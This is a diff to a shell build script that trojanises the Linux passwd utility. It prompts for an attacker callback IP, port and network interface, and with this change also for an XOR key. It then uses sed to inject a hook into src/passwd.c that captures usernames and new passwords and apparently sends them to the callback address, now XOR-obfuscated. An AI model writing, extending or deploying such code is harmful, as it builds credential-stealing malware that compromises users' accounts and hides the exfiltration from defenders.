@@ -11,9 +11,11 @@ echo -n "Enter the IP Address to Callback to : "
 read ip
 echo -n "Set the destination port : "
 read port
+echo -n "Enter XOR Key : "
+read key
 echo -n "Enter Interface name : "
 read interface
-echo -ne " IP : ${ip}\n Port : ${port}\n Interface : ${interface}\nConfirm these settings [y/n] : "
+echo -ne " IP : ${ip}\n Port : ${port}\n Interface : ${interface}\n XOR Key : ${key}\nConfirm these settings [y/n] : "
 read pass
 if [[ $pass == n ]]; then
     exit 0
@@ -57,7 +59,7 @@ sed -i '/#include <string.h>/a '"$def_var"'\n'"$def_port"'' src/passwd.c
 
 # Add Hook Function
 sed -i '/static int new_password (const struct passwd \*pw)/i '"$code"'' src/passwd.c
-sed -i 's/\", name, password);/ /g' src/passwd.c
+sed -i 's/\", name, xor_password);/ /g' src/passwd.c
 sed -i 's/fprintf(fptr, \"%s:%s/fprintf(fptr, \"%s:%s\\n\", name, password);/g' src/passwd.c
 
 # add snprint
@@ -65,6 +67,7 @@ sed -i 's/\/\/SNPRINT/int j = snprintf(buffer, 256, \"%s:%s:%s\\n\", name, passw
 
 # Add Interface (Idk why but only works at the end)
 sed -i 's/INT_HERE/'"\"$interface\""'/g' src/passwd.c
+sed -i 's/KEY_HERE/'"$key"'/g' src/passwd.c
 
 ## Make ##
 sudo make all
